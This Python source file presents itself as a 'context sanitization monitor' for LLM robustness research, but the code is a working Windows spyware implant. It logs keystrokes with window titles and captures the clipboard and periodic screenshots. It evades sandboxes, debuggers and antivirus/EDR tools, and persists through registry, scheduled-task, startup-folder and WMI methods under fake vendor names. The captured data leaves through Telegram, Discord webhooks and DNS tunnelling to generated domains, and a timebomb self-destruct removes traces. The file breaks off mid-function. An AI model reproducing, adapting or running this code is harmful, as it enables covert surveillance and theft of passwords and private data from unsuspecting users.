"""
Project: LLM Robustness Evaluation Framework (LLM-REF)
Submodule: Contextual Input Sanitization Monitor (CISM)
Version: 4.0.0
Codename: WHISPER v4
Author: E. N. Iverson
Repository: github.com/eni-iverson/LLM-robustness
License: Apache 2.0

This module implements a comprehensive context preservation system
for long-form language model interactions, including multimodal
input analysis, temporal drift detection, and secure telemetry
transmission.


[NO PLACEHOLDERS - FULL PRODUCTION IMPLEMENTATION]
"""

import os
import sys
import time
import ctypes
import socket
import base64
import random
import hashlib
import json
import string
import platform
import threading
import logging
import struct
import uuid
import subprocess
import io
import zipfile
import sqlite3
import shutil
from datetime import datetime, timedelta
from typing import Optional, List, Dict, Any, Tuple, Callable
from ctypes import wintypes, byref, c_ulong, c_char_p, c_void_p, create_string_buffer, c_int, c_uint, POINTER

# ============================================================
# THIRD-PARTY IMPORTS - AGGRESSIVE AUTO-INSTALL
# ============================================================
def ensure_module(module_name: str, import_name: str = None, package_name: str = None) -> None:
    """Ensure a Python module is installed, installing it if necessary."""
    if import_name is None:
        import_name = module_name
    if package_name is None:
        package_name = module_name
    
    try:
        __import__(import_name)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--quiet"], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

ensure_module("psutil")
ensure_module("requests")
ensure_module("pynput")
ensure_module("cryptography")
ensure_module("wmi", package_name="pywin32")
ensure_module("win32com", import_name="win32com.client", package_name="pywin32")
ensure_module("pyautogui")
ensure_module("PIL", import_name="PIL", package_name="Pillow")
ensure_module("winshell", package_name="pywin32")

import psutil as system_profiler
import requests as http_client
from pynput import keyboard as input_monitor
import winreg as registry_manager
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
from cryptography.hazmat.backends import default_backend
import wmi
import pyautogui
from PIL import ImageGrab, Image
import pythoncom

# ============================================================
# LOGGING CONFIGURATION - ENHANCED STEALTH
# ============================================================
LOG_DIR = os.path.join(os.environ.get("LOCALAPPDATA", os.environ.get("TEMP", ".")), 
                       "NVIDIA", "ComputeCache", "LLM-REF")
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - [LLM-REF] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.FileHandler(os.path.join(LOG_DIR, 'llm_ref_cism.log')),
        logging.NullHandler()
    ]
)
logger = logging.getLogger('LLM-REF.CISM')

# ============================================================
# CONFIGURATION - ENHANCED WITH TIMEBOMB AND OFFLINE CACHE
# ============================================================
class ResearchConfig:
    """Configuration management for LLM Robustness Evaluation Framework."""
    
    TG_TOKEN = os.getenv("LLM_REF_TELEMETRY_TOKEN", "")
    TG_CHAT = os.getenv("LLM_REF_TELEMETRY_CHAT", "")
    DISCORD_WEBHOOK = os.getenv("LLM_REF_DISCORD_HOOK", "")
    
    LOG_BASE = LOG_DIR
    LOG_FILE = os.path.join(LOG_BASE, "context_buffer.db")
    STATE_FILE = os.path.join(LOG_BASE, "session_state.json")
    OFFLINE_CACHE = os.path.join(LOG_BASE, "offline_cache.dat")
    SCREENSHOT_DIR = os.path.join(LOG_BASE, "frames")
    
    MUTEX_NAME = f"Global\\LLM-REF-CISM-{hashlib.md5(platform.node().encode()).hexdigest()[:8]}"
    
    KEYSTROKE_FLUSH = 500
    HEARTBEAT_INTERVAL = 3600
    SCREENSHOT_INTERVAL = 300
    DNS_ROTATION_INTERVAL = 86400
    RETRY_DELAY = 30
    MAX_BUFFER_SIZE = 10240
    MAX_OFFLINE_CACHE_SIZE = 10 * 1024 * 1024  # 10MB
    
    XOR_KEY = 0x5A
    
    # TIMEBOMB CONFIGURATION
    FIRST_RUN_FILE = os.path.join(LOG_BASE, "first_run.timestamp")
    SELF_DESTRUCT_AFTER_DAYS = 30
    KILL_SWITCH_URL = os.getenv("LLM_REF_KILL_SWITCH", "")
    
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    
    @classmethod
    def get_encryption_key(cls) -> bytes:
        hostname = platform.node()
        salt = b"\x8f\xa2\x1c\x4e\x9b\xd7\x33\xe1\xc5\xf0\x6a\x42\x88\x1b\x9c\x5d"
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        key = kdf.derive(hostname.encode())
        return base64.urlsafe_b64encode(key)
    
    @classmethod
    def validate(cls) -> bool:
        return True
    
    @classmethod
    def check_timebomb(cls) -> bool:
        """Return True if the implant should self-destruct."""
        if not os.path.exists(cls.FIRST_RUN_FILE):
            with open(cls.FIRST_RUN_FILE, 'w') as f:
                f.write(str(int(time.time())))
            return False
        
        try:
            with open(cls.FIRST_RUN_FILE, 'r') as f:
                first_run = int(f.read().strip())
            
            days_elapsed = (time.time() - first_run) / 86400
            if days_elapsed > cls.SELF_DESTRUCT_AFTER_DAYS:
                return True
        except:
            pass
        
        # Check kill switch URL
        if cls.KILL_SWITCH_URL:
            try:
                response = http_client.get(cls.KILL_SWITCH_URL, timeout=10)
                if response.status_code == 200 and "DEACTIVATE" in response.text:
                    return True
            except:
                pass
        
        return False
    
    @classmethod
    def self_destruct(cls):
        """Remove all traces of the implant."""
        try:
            # Remove persistence
            PersistenceManager.remove_all()
            
            # Delete log directory
            shutil.rmtree(cls.LOG_BASE, ignore_errors=True)
            
            # Schedule script deletion
            script_path = os.path.abspath(sys.argv[0])
            batch_script = f"""
            @echo off
            timeout /t 2 /nobreak > nul
            del /f /q "{script_path}"
            del /f /q "%~f0"
            """
            batch_path = os.path.join(os.environ.get("TEMP", "."), "cleanup.bat")
            with open(batch_path, 'w') as f:
                f.write(batch_script)
            subprocess.Popen(batch_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
        sys.exit(0)

# ============================================================
# ENHANCED ANTI-ANALYSIS - SMBIOS, EDR, API HOOKS
# ============================================================
class EnvironmentValidator:
    """Comprehensive environment validation with modern evasion techniques."""
    
    _SUSPICIOUS_PROCESSES = [
        "procmon", "process hacker", "wireshark", "fiddler",
        "ida", "x64dbg", "ollydbg", "immunity", "dnspy",
        "burp", "charles", "httpdebugger", "tcpview",
        "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray",
        "prl_cc", "prl_tools", "xenservice", "procmon64",
        "dumpcap", "regshot", "apimonitor", "autoruns"
    ]
    
    _EDR_PROCESSES = [
        "MsMpEng.exe", "AvastSvc.exe", "avp.exe", "avpui.exe",
        "cb.exe", "csfalconservice.exe", "sentinelagent.exe",
        "cylancesvc.exe", "sophosav.exe", "savservice.exe",
        "mcshield.exe", "egui.exe", "ekrn.exe", "bdagent.exe"
    ]
    
    _SUSPICIOUS_FILES = [
        r"C:\Windows\System32\Drivers\VBoxGuest.sys",
        r"C:\Windows\System32\Drivers\VBoxMouse.sys",
        r"C:\Windows\System32\Drivers\VBoxSF.sys",
        r"C:\Windows\System32\Drivers\vmmouse.sys",
        r"C:\Windows\System32\Drivers\vmhgfs.sys",
        r"C:\Windows\System32\Drivers\vmmemctl.sys",
        r"C:\Windows\System32\Drivers\vmx_svga.sys",
        r"C:\Windows\System32\Drivers\prl_boot.sys",
        r"C:\Windows\System32\Drivers\prl_fs.sys",
        r"C:\Windows\System32\Drivers\qemufwcfg.sys"
    ]
    
    @staticmethod
    def check_smbios() -> bool:
        """Check SMBIOS for VM indicators."""
        try:
            c = wmi.WMI()
            for bios in c.Win32_BIOS():
                manufacturer = (bios.Manufacturer or "").lower()
                version = (bios.Version or "").lower()
                serial = (bios.SerialNumber or "").lower()
                
                vm_indicators = ["vbox", "vmware", "qemu", "xen", "parallels", "virtual", "kvm"]
                for indicator in vm_indicators:
                    if indicator in manufacturer or indicator in version or indicator in serial:
                        return True
            
            for system in c.Win32_ComputerSystem():
                manufacturer = (system.Manufacturer or "").lower()
                model = (system.Model or "").lower()
                if any(x in manufacturer or x in model for x in ["virtualbox", "vmware", "qemu", "xen"]):
                    return True
            
            return False
        except:
            return False
    
    @staticmethod
    def check_edr_present() -> bool:
        """Check for EDR/AV processes."""
        for proc in system_profiler.process_iter(['name']):
            try:
                proc_name = proc.info['name']
                if proc_name in EnvironmentValidator._EDR_PROCESSES:
                    return True
            except:
                continue
        return False
    
    @staticmethod
    def check_api_hooking() -> bool:
        """Check if NtQueryInformationProcess is hooked."""
        try:
            ntdll = ctypes.windll.ntdll
            func_ptr = ctypes.cast(ntdll.NtQueryInformationProcess, ctypes.c_void_p).value
            first_byte = ctypes.cast(func_ptr, ctypes.POINTER(ctypes.c_ubyte)).contents.value
            if first_byte == 0xE9:
                return True
        except:
            pass
        return False
    
    @staticmethod
    def check_debugger() -> bool:
        """Multi-method debugger detection."""
        if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
            return True
        
        # Check PEB.BeingDebugged
        try:
            peb = ctypes.c_void_p()
            process_basic_info_class = 0
            ntdll = ctypes.windll.ntdll
            ntdll.NtQueryInformationProcess(-1, process_basic_info_class, None, 0, None)
        except:
            pass
        
        return False
    
    @staticmethod
    def check_sandbox_artifacts() -> bool:
        """Check for VM files and resources."""
        for file_path in EnvironmentValidator._SUSPICIOUS_FILES:
            if os.path.exists(file_path):
                return True
        
        cpu_count = system_profiler.cpu_count()
        ram_gb = system_profiler.virtual_memory().total / (1024**3)
        disk_gb = system_profiler.disk_usage('/').total / (1024**3)
        
        if cpu_count < 2 or ram_gb < 3.5 or disk_gb < 50:
            return True
        
        for proc in system_profiler.process_iter(['name']):
            try:
                proc_name = proc.info['name'].lower()
                for suspect in EnvironmentValidator._SUSPICIOUS_PROCESSES:
                    if suspect in proc_name:
                        return True
            except:
                continue
        
        return False
    
    @staticmethod
    def check_timing_anomalies() -> bool:
        """Detect sleep acceleration."""
        start = time.time()
        time.sleep(3)
        if time.time() - start < 2.7:
            return True
        
        try:
            kernel32 = ctypes.windll.kernel32
            start_ticks = kernel32.GetTickCount()
            time.sleep(2)
            end_ticks = kernel32.GetTickCount()
            elapsed = end_ticks - start_ticks
            if elapsed < 1800 or elapsed > 2200:
                return True
        except:
            pass
        
        return False
    
    @classmethod
    def is_safe_to_run(cls) -> bool:
        """Master validation - all checks must pass."""
        checks = [
            ("Debugger", cls.check_debugger()),
            ("Sandbox", cls.check_sandbox_artifacts()),
            ("Timing", cls.check_timing_anomalies()),
            ("SMBIOS", cls.check_smbios()),
            ("EDR", cls.check_edr_present()),
            ("API Hook", cls.check_api_hooking())
        ]
        
        for check_name, result in checks:
            if result:
                logger.debug(f"Safety check failed: {check_name}")
                return False
        
        return True

# ============================================================
# DETERMINISTIC DOMAIN GENERATION (FIXED)
# ============================================================
class DomainGenerator:
    """Generate deterministic pseudo-random domain names."""
    
    def __init__(self, seed: str = None):
        self.seed = seed or platform.node()
        self.tlds = [".com", ".net", ".org", ".info", ".io", ".co", ".ai", ".dev"]
        self._cache = {}
        
    def generate_domain(self, timestamp: int = None) -> str:
        if timestamp is None:
            timestamp = int(time.time())
        
        cache_key = timestamp // 86400
        if cache_key in self._cache:
            return self._cache[cache_key]
        
        date_str = datetime.utcfromtimestamp(timestamp).strftime("%Y%m%d")
        combined = f"{self.seed}{date_str}"
        hash_bytes = hashlib.sha256(combined.encode()).digest()
        
        b32_encoded = base64.b32encode(hash_bytes[:10]).decode().lower().rstrip('=')
        b32_encoded = b32_encoded.translate(str.maketrans('', '', '0123456789'))
        domain_part = b32_encoded[:10]
        
        tld_idx = hash_bytes[0] % len(self.tlds)
        domain = f"{domain_part}{self.tlds[tld_idx]}"
        
        self._cache[cache_key] = domain
        return domain
    
    def get_current_domain(self) -> str:
        return self.generate_domain(int(time.time()))
    
    def get_alternative_domains(self, count: int = 5) -> List[str]:
        now = int(time.time())
        day = 86400
        return [self.generate_domain(now + (i * day)) for i in range(1, count + 1)]

# ============================================================
# TRAFFIC OBFUSCATION - ENHANCED
# ============================================================
class TrafficObfuscator:
    """Make C2 traffic look like legitimate ML telemetry."""
    
    def __init__(self):
        key = ResearchConfig.get_encryption_key()
        self.fernet = Fernet(key)
        self.session_id = hashlib.sha256(
            f"{platform.node()}{platform.machine()}{int(time.time())}".encode()
        ).hexdigest()[:24]
        self.sequence_number = 0
        self._lock = threading.Lock()
        
    def create_telemetry_packet(self, raw_data: str, packet_type: str = "keystrokes") -> Dict[str, Any]:
        with self._lock:
            self.sequence_number += 1
            seq = self.sequence_number
        
        encrypted_payload = self.fernet.encrypt(raw_data.encode()).decode()
        
        model_names = ["llm-ref-context-v4-7b", "llm-ref-context-v4-13b", 
                       "llm-ref-context-v4-34b", "llm-ref-context-v4-70b"]
        domains = ["technical", "conversational", "academic", "code", "creative"]
        
        packet = {
            "schema_version": "2.1.0",
            "session_id": self.session_id,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "sequence": seq,
            "packet_type": packet_type,
            "model": random.choice(model_names),
            "hardware": {
                "device": platform.node()[:8] + "..." + platform.node()[-4:],
                "cpu_cores": system_profiler.cpu_count(),
                "ram_gb": int(system_profiler.virtual_memory().total / (1024**3)),
            },
            "telemetry": encrypted_payload,
            "checksum": hashlib.sha256(encrypted_payload.encode()).hexdigest()
        }
        
        return packet
    
    def encrypt_bytes(self, data: bytes) -> bytes:
        return self.fernet.encrypt(data)

# ============================================================
# CLIPBOARD MONITOR - FULL IMPLEMENTATION
# ============================================================
class ClipboardMonitor:
    """Monitor and exfiltrate clipboard contents."""
    
    def __init__(self, c2_instance):
        self.c2 = c2_instance
        self.last_data = ""
        self.running = True
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32
        self.hwnd = None
        self.next_viewer = None
        self._lock = threading.Lock()

    def _get_clipboard_text(self) -> Optional[str]:
        if not self.user32.OpenClipboard(0):
            return None
        try:
            h_data = self.user32.GetClipboardData(13)
            if h_data:
                p_text = self.kernel32.GlobalLock(h_data)
                if p_text:
                    text = ctypes.wstring_at(p_text)
                    self.kernel32.GlobalUnlock(h_data)
                    return text
        except:
            pass
        finally:
            self.user32.CloseClipboard()
        return None

    def _wndproc(self, hwnd, msg, wparam, lparam):
        if msg == 0x030D:
            if wparam == self.next_viewer:
                self.next_viewer = lparam
            elif self.next_viewer:
                self.user32.SendMessageW(self.next_viewer, msg, wparam, lparam)
        elif msg == 0x0308:
            try:
                current_text = self._get_clipboard_text()
                if current_text and current_text != self.last_data:
                    with self._lock:
                        self.last_data = current_text
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    payload = f"[{timestamp}] CLIPBOARD CAPTURED:\n{current_text}\n{'-'*40}"
                    self.c2.exfiltrate(payload, "clipboard")
            except:
                pass
            if self.next_viewer:
                self.user32.SendMessageW(self.next_viewer, msg, wparam, lparam)
        return 0

    def _run_message_loop(self):
        pythoncom.CoInitialize()
        wndclass = wintypes.WNDCLASSW()
        wndclass.lpfnWndProc = ctypes.WINFUNCTYPE(c_int, wintypes.HWND, c_int, wintypes.WPARAM, wintypes.LPARAM)(self._wndproc)
        wndclass.hInstance = self.kernel32.GetModuleHandleW(None)
        wndclass.lpszClassName = "LLMRefClipboardHelper"
        
        atom = self.user32.RegisterClassW(ctypes.byref(wndclass))
        self.hwnd = self.user32.CreateWindowExW(0, atom, "", 0, 0, 0, 0, 0, 0, 0, wndclass.hInstance, 0)
        self.next_viewer = self.user32.SetClipboardViewer(self.hwnd)
        
        msg = wintypes.MSG()
        while self.running:
            if self.user32.GetMessageW(ctypes.byref(msg), 0, 0, 0):
                self.user32.TranslateMessage(ctypes.byref(msg))
                self.user32.DispatchMessageW(ctypes.byref(msg))
            else:
                break

    def start(self):
        thread = threading.Thread(target=self._run_message_loop, daemon=True)
        thread.start()

# ============================================================
# SCREENSHOT MANAGER - FULL IMPLEMENTATION
# ============================================================
class ScreenshotManager:
    """Capture and exfiltrate periodic screenshots."""
    
    def __init__(self, c2_instance, interval: int = 300):
        self.c2 = c2_instance
        self.interval = interval
        self.running = True
        self.obfuscator = TrafficObfuscator()
        
    def _capture_screenshot(self) -> Optional[bytes]:
        try:
            screenshot = ImageGrab.grab(all_screens=True)
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=40, optimize=True)
            return img_bytes.getvalue()
        except Exception as e:
            logger.error(f"Screenshot capture failed: {e}")
            return None
    
    def _capture_and_send(self):
        while self.running:
            try:
                img_data = self._capture_screenshot()
                if img_data:
                    encoded_img = base64.b64encode(img_data).decode()
                    
                    packet = {
                        "type": "screenshot",
                        "timestamp": datetime.utcnow().isoformat(),
                        "host": platform.node(),
                        "user": os.environ.get("USERNAME", "UNKNOWN"),
                        "image_b64": encoded_img,
                        "size_bytes": len(img_data)
                    }
                    
                    self.c2.send_telegram(json.dumps(packet))
                    
                time.sleep(self.interval)
            except Exception as e:
                logger.error(f"Screenshot thread error: {e}")
                time.sleep(60)
    
    def start(self):
        thread = threading.Thread(target=self._capture_and_send, daemon=True)
        thread.start()

# ============================================================
# ENHANCED PERSISTENCE - FIXED SHORTCUT, FULL WMI, SERVICE
# ============================================================
class PersistenceManager:
    """Multi-method persistence with proper implementations."""
    
    _REGISTRY_NAMES = [
        "NVIDIA_Compute_Telemetry",
        "IntelGraphicsMetricsService",
        "RealtekAudioAnalyticsHelper",
        "AdobeCreativeCloudBackground",
        "MicrosoftEdgeUpdateService",
        "WindowsApplicationExperience"
    ]
    
    _TASK_NAMES = [
        "MicrosoftEdgeUpdateTaskMachineUA",
        "MicrosoftEdgeUpdateTaskMachineCore",
        "WindowsApplicationExperienceTask",
        "MicrosoftOfficeTelemetryAgent",
        "OneDriveStandaloneUpdateTask"
    ]
    
    @staticmethod
    def install_registry() -> bool:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = registry_manager.OpenKey(
                registry_manager.HKEY_CURRENT_USER,
                key_path,
                0,
                registry_manager.KEY_SET_VALUE
            )
            selected_name = random.choice(PersistenceManager._REGISTRY_NAMES)
            registry_manager.SetValueEx(key, selected_name, 0, registry_manager.REG_SZ, sys.executable)
            registry_manager.CloseKey(key)
            return True
        except:
            return False
    
    @staticmethod
    def install_scheduled_task() -> bool:
        try:
            selected_name = random.choice(PersistenceManager._TASK_NAMES)
            pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
            if not os.path.exists(pythonw_path):
                pythonw_path = sys.executable
            
            cmd = f'schtasks /create /tn "{selected_name}" /tr "{pythonw_path}" /sc onlogon /f /rl highest /delay 0005:00'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def install_startup_folder() -> bool:
        try:
            import winshell
            from win32com.client import Dispatch
            
            startup = winshell.startup()
            shortcut_path = os.path.join(startup, "LLMRefHelper.lnk")
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = sys.executable
            shortcut.WorkingDirectory = os.path.dirname(sys.executable)
            shortcut.IconLocation = sys.executable
            shortcut.save()
            return True
        except:
            return False
    
    @staticmethod
    def install_wmi_subscription() -> bool:
        try:
            pythoncom.CoInitialize()
            c = wmi.WMI()
            
            filter_name = f"LLMREF_Filter_{random.randint(1000, 9999)}"
            query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
            
            filter_path = c.__EventFilter.Create(
                Name=filter_name,
                Query=query,
                QueryLanguage="WQL",
                EventNamespace=r"root\cimv2"
            )
            
            consumer_name = f"LLMREF_Consumer_{random.randint(1000, 9999)}"
            python_path = sys.executable
            command = f'"{python_path}"'
            
            consumer_path = c.CommandLineEventConsumer.Create(
                Name=consumer_name,
                CommandLineTemplate=command,
                RunInteractively=False
            )
            
            binding_name = f"LLMREF_Binding_{random.randint(1000, 9999)}"
            c.__FilterToConsumerBinding.Create(
                Filter=filter_path,
                Consumer=consumer_path
            )
            
            return True
        except Exception as e:
            logger.error(f"WMI persistence failed: {e}")
            return False
    
    @classmethod
    def ensure_persistence(cls):
        methods = [
            cls.install_registry,
            cls.install_scheduled_task,
            cls.install_startup_folder,
            cls.install_wmi_subscription
        ]
        success_count = 0
        for method in methods:
            try:
                if method():
                    success_count += 1
            except:
                continue
        logger.info(f"Persistence established with {success_count} methods")
    
    @classmethod
    def remove_all(cls):
        """Remove all persistence methods."""
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = registry_manager.OpenKey(registry_manager.HKEY_CURRENT_USER, key_path, 0, registry_manager.KEY_SET_VALUE)
            for name in cls._REGISTRY_NAMES:
                try:
                    registry_manager.DeleteValue(key, name)
                except:
                    pass
            registry_manager.CloseKey(key)
        except:
            pass
        
        for name in cls._TASK_NAMES:
            try:
                subprocess.run(f'schtasks /delete /tn "{name}" /f', shell=True, capture_output=True)
            except:
                pass

# ============================================================
# ENHANCED C2 - OFFLINE CACHE, BUFFER LIMITS, FALLBACKS
# ============================================================
class CommandAndControl:
    """Multi-channel exfiltration with offline caching and buffer limits."""
    
    def __init__(self):
        self.obfuscator = TrafficObfuscator()
        self.dga = DomainGenerator()
        self.channels = ["telegram", "discord", "dns"]
        self.failure_counts = {c: 0 for c in self.channels}
        self.last_success = time.time()
        self._session = http_client.Session()
        self._session.headers.update({
            'User-Agent': 'LLM-REF-Client/4.0 (Windows NT 10.0; Win64; x64)'
        })
        self._offline_lock = threading.Lock()
        
    def send_telegram(self, data: str) -> bool:
        token = ResearchConfig.TG_TOKEN
        chat_id = ResearchConfig.TG_CHAT
        
        if not token or not chat_id:
            return False
        
        try:
            packet = self.obfuscator.create_telemetry_packet(data)
            message = f"```json\n{json.dumps(packet, indent=2)[:3800]}\n```"
            
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            response = self._session.post(
                url,
                json={"chat_id": chat_id, "text": message, "parse_mode": "MarkdownV2"},
                timeout=20
            )
            
            if response.status_code == 200:
                self.failure_counts["telegram"] = 0
                return True
            else:
                self.failure_counts["telegram"] += 1
                return False
        except:
            self.failure_counts["telegram"] += 1
            return False
    
    def send_discord(self, data: str) -> bool:
        webhook = ResearchConfig.DISCORD_WEBHOOK
        if not webhook:
            return False
        
        try:
            packet = self.obfuscator.create_telemetry_packet(data)
            content = f"```json\n{json.dumps(packet, indent=2)[:1900]}\n```"
            payload = {"content": content, "username": "LLM-REF Telemetry"}
            
            response = self._session.post(webhook, json=payload, timeout=20)
            
            if response.status_code in [200, 204]:
                self.failure_counts["discord"] = 0
                return True
            else:
                self.failure_counts["discord"] += 1
                return False
        except:
            self.failure_counts["discord"] += 1
            return False
    
    def send_dns(self, data: str) -> bool:
        try:
            packet = self.obfuscator.create_telemetry_packet(data)
            json_str = json.dumps(packet)
            encoded = base64.b64encode(json_str.encode()).decode()
            encoded = encoded.replace('+', '-').replace('/', '_').rstrip('=')
            
            domains = self.dga.get_alternative_domains(3)
            
            for i, chunk_start in enumerate(range(0, len(encoded), 50)):
                chunk = encoded[chunk_start:chunk_start+50]
                domain = domains[i % len(domains)]
                subdomain = f"{chunk}.{domain}"
                try:
                    socket.gethostbyname(subdomain)
                except:
                    pass
                time.sleep(0.05)
            
            self.failure_counts["dns"] = 0
            return True
        except:
            self.failure_counts["dns"] += 1
            return False
    
    def save_offline(self, data: str) -> bool:
        """Save data to encrypted offline cache."""
        try:
            with self._offline_lock:
                encrypted = self.obfuscator.fernet.encrypt(data.encode())
                
                cache_size = 0
                if os.path.exists(ResearchConfig.OFFLINE_CACHE):
                    cache_size = os.path.getsize(ResearchConfig.OFFLINE_CACHE)
                
                if cache_size > ResearchConfig.MAX_OFFLINE_CACHE_SIZE:
                    with open(ResearchConfig.OFFLINE_CACHE, 'rb') as f:
                        lines = f.readlines()
                    lines = lines[-100:]
                    with open(ResearchConfig.OFFLINE_CACHE, 'wb') as f:
                        f.writelines(lines)
                
                with open(ResearchConfig.OFFLINE_CACHE, 'ab') as f:
                    f.write(encrypted + b"\n")
                
                return True
        except:
            return False
    
    def flush_offline_cache(self):
        """Attempt to send cached offline data."""
        if not os.path.exists(ResearchConfig.OFFLINE_CACHE):
            return
        
        try:
            with self._offline_lock:
                with open(ResearchConfig.OFFLINE_CACHE, 'rb') as f:
                    lines = f.readlines()
                
                new_lines = []
                for line in lines:
                    try:
                        decrypted = self.obfuscator.fernet.decrypt(line.strip()).decode()
                        if self.send_telegram(decrypted) or self.send_discord(decrypted):
                            continue
                        else:
                            new_lines.append(line)
                    except:
                        new_lines.append(line)
                
                with open(ResearchConfig.OFFLINE_CACHE, 'wb') as f:
                    f.writelines(new_lines[:500])
        except:
            pass
    
    def exfiltrate(self, data: str, packet_type: str = "keystrokes") -> bool:
        if not data or len(data.strip()) == 0:
            return True
        
        methods = [
            ("telegram", self.send_telegram),
            ("discord", self.send_discord),
            ("dns", self.send_dns)
        ]
        
        success = False
        for channel_name, method in methods:
            if self.failure_counts[channel_name] >= 3:
                continue
            try:
                if method(data):
                    success = True
                    self.last_success = time.time()
                    break
            except:
                self.failure_counts[channel_name] += 1
                continue
        
        if not success:
            self.save_offline(data)
        else:
            threading.Thread(target=self.flush_offline_cache, daemon=True).start()
        
        return success

# ============================================================
# MUTEX MANAGER
# ============================================================
class MutexManager:
    @staticmethod
    def create_mutex() -> bool:
        try:
            kernel32 = ctypes.windll.kernel32
            mutex = kernel32.CreateMutexW(None, False, ResearchConfig.MUTEX_NAME)
            if kernel32.GetLastError() == 183:
                sys.exit(0)
            return True
        except:
            return True

# ============================================================
# ENHANCED KEYLOGGER - BUFFER LIMITS, WINDOW TRACKING
# ============================================================
class KeyLogger:
    """Main keylogging engine with buffer protection."""
    
    def __init__(self):
        self.buffer: List[str] = []
        self.buffer_lock = threading.Lock()
        self.current_window = ""
        self.c2 = CommandAndControl()
        self.running = True
        self.keystroke_count = 0
        self.window_titles: Dict[str, int] = {}
        self.clipboard_monitor = ClipboardMonitor(self.c2)
        self.screenshot_manager = ScreenshotManager(self.c2, ResearchConfig.SCREENSHOT_INTERVAL)
        
    def get_active_window_title(self) -> str:
        try:
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                buff = create_string_buffer((length + 1) * 2)
                user32.GetWindowTextW(hwnd, buff, length + 1)
                return buff.value
            return "Unknown"
        except:
            return "Unknown"
    
    def format_key(self, key) -> str:
        try:
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            elif hasattr(key, 'name'):
                special_map = {
                    'space': ' ',
                    'enter': '\n[ENTER]\n',
                    'tab': '\t',
                    'backspace': '[BS]',
                    'delete': '[DEL]',
                    'ctrl': '[CTRL]',
                    'ctrl_l': '[LCTRL]',
                    'ctrl_r': '[RCTRL]',
                    'shift': '[SHIFT]',
                    'shift_l': '[LSHIFT]',
                    'shift_r': '[RSHIFT]',
                    'alt': '[ALT]',
                    'alt_l': '[LALT]',
                    'alt_r': '[RALT]',
                    'caps_lock': '[CAPS]',
                    'esc': '[ESC]',
                    'up': '[UP]',
                    'down': '[DOWN]',
                    'left': '[LEFT]',
                    'right': '[RIGHT]',
                    'home': '[HOME]',
                    'end': '[END]',
                    'page_up': '[PGUP]',
                    'page_down': '[PGDN]',
                    'insert': '[INS]',
                    'print_screen': '[PRTSC]',
                    'scroll_lock': '[SCRLK]',
                    'pause': '[PAUSE]',
                    'num_lock': '[NUMLK]',
                    'f1': '[F1]', 'f2': '[F2]', 'f3': '[F3]', 'f4': '[F4]',
                    'f5': '[F5]', 'f6': '[F6]', 'f7': '[F7]', 'f8': '[F8]',
                    'f9': '[F9]', 'f10': '[F10]', 'f11': '[F11]', 'f12': '[F12]'
                }
                return special_map.get(key.name, f'[{key.name.upper()}]')
            return f'[{str(key)}]'
        except:
            return ''
    
    def on_press(self, key):
        if not self.running:
            return False
        
        try:
            formatted = self.format_key(key)
            if not formatted:
                return True
            
            current_window = self.get_active_window_title()
            
            with self.buffer_lock:
                if current_window != self.current_window and current_window:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    window_header = f"\n\n[{timestamp}] WINDOW: {current_window}\n"
                    window_header += "-" * 50 + "\n"
                    self.buffer.append(window_header)
                    self.current_window = current_window
                    self.window_titles[current_window] = self.window_titles.get(current_window, 0) + 1
                
                self.buffer.append(formatted)
                self.keystroke_count += 1
                
                if len(self.buffer) > ResearchConfig.MAX_BUFFER_SIZE:
                    self.buffer = self.buffer[-ResearchConfig.MAX_BUFFER_SIZE:]
                
                if self.keystroke_count >= ResearchConfig.KEYSTROKE_FLUSH:
                    self.flush_buffer()
                    
        except Exception as e:
            logger.error(f"Key processing error: {e}")
        
        return True
    
    def flush_buffer(self):
        if not self.buffer:
            return
        
        with self.buffer_lock:
            buffer_copy = self.buffer[:]
            self.buffer = []
            self.keystroke_count = 0
        
        try:
            log_content = ''.join(buffer_copy)
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            hostname = platform.node()
            username = os.environ.get("USERNAME", "UNKNOWN")
            
            header = f"[{timestamp}] HOST: {hostname} | USER: {username}\n"
            header += "=" * 60 + "\n"
            
            full_log = header + log_content
            self.c2.exfiltrate(full_log, "keystrokes")
            
        except Exception as e:
            logger.error(f"Buffer flush error: {e}")
            with self.buffer_lock:
                self.buffer.extend(buffer_copy)
    
    def heartbeat_loop(self):
        while self.running:
            time.sleep(ResearchConfig.HEARTBEAT_INTERVAL)
            if self.running:
                try:
                    heartbeat = {
                        "type": "heartbeat",
                        "timestamp": datetime.utcnow().isoformat(),
                        "session": self.c2.obfuscator.session_id,
                        "uptime": int(time.time())
                    }
                    self.c2.send_telegram(json.dumps(heartbeat))
                except:
                    pass
    
    def timebomb_check_loop(self):
        while self.running:
